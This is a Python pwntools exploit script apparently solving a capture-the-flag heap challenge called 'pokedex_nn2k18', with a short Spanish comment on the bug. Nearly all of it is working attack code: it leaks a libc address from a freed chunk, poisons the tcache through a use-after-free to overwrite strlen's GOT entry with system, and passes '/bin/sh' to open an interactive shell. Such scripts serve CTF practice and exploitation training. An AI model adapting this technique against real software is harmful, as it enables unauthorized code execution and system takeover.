# Coding: utf-8
from pwn import *

def menu(n):
	io.recvuntil("option> ")
	io.sendline(str(n))

def create(pos, name, height, weight, power):
	menu(1)
	io.recvuntil("Enter the new pokemon ID: ")
	io.sendline(str(pos))
	io.recvuntil("Name: ")
	io.sendline(name)
	io.recvuntil("Height: ")
	io.sendline(str(height))
	io.recvuntil("Weight: ")
	io.sendline(str(weight))
	io.recvuntil("Power: ")
	io.sendline(str(power))

def view(num):
	menu(4)
	io.recvuntil("Enter the ID to print: ")
	io.sendline(str(num))
	io.recvuntil("Name: ")
	return u64(io.recv(6).ljust(8, '\0'))

def delete(num):
	menu(3)
	io.recvuntil("Insert the ID to delete: ")
	io.sendline(str(num))

def edit(num, name, height, weight, power, shell=False):
	menu(2)
	io.recvuntil("Enter the ID to edit: ")
	io.sendline(str(num))
	io.recvuntil("New name: ")
	io.sendline(name)
	if shell: return
	io.recvuntil("Height: ")
	io.sendline(str(height))
	io.recvuntil("Weight: ")
	io.sendline(str(weight))
	io.recvuntil("Power: ")
	io.sendline(str(power))

def attach(addr):
	gdb.attach(io, 'b *{:#x}\nc'.format(addr))

local = True
binary = ELF("./pokedex_nn2k18", checksec=False)
# libc = ELF("./pokedex_nn2k18-libc-2.27.so", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so", checksec=False)
env = {"LD_PRELOAD" : libc.path}
io = process(binary.path, env=env) if local else remote("challenges.ka0labs.org", 1341)
# attach(0x4013f6)
create(0, "A"*0x800, 1, 1, 100)
create(1, "B"*0x800, 1, 1, 100)

delete(0)
# libc.address = view(0) - 0x1b7ca0
libc.address = view(0) - 0x3ebca0

print "[+] base_libc: 0x%x" % libc.address

hook = binary.got['strlen']
system = libc.symbols['system']
printf = libc.symbols['printf']
read = libc.symbols['read']
memcpy = libc.symbols['memcpy']

print "[+] hook: 0x%x" % hook
print "[+] system: 0x%x" % system

create(2, "C"*0x20, 1, 1, 100)

delete(2)
'''
En la funcion edit (la libc) internamente si no se pasa un nbytes = read(name), nbytes == (pokemon->name_len + 1) 
al crear fastidia el forward (tcache_chunk->fd) y no se puede conseguir el User-After-Free
'''
edit(2, p64(hook) + "C"*0x19, 1, 1, 100)
create(3, "D"*0x20, 1, 1, 100)
create(4, p64(system) + p64(printf) + p64(read) + p64(memcpy), 1, 1, 100)

# arg to system
edit(3, "/bin/sh\0", 1, 1, 100, True)

io.interactive()
